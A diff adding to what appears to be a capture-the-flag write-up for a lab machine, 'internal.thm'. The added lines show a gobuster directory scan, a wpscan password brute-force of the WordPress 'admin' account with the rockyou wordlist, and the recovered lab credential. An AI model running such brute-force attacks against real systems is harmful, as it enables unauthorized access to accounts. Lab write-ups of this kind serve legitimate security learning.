@@ -31,5 +31,28 @@ PORT   STATE SERVICE REASON         VERSION
 ```
 
 ```bash
+gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt,php,html -t64
 
 ```
+
+### WORDPRESS ###
++ First we use tool "Wpscan" to scan the website wordpress:
+
+![alt text](image.png)
+
+![alt text](image-2.png)
+
++ We've found the user "admin" and we continue to scan user:
+
+```bash
+wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
+```
+
+![alt text](image-3.png)
+
+--> We had the credential Wordpress admin:my2boys
+
+
+
+
+
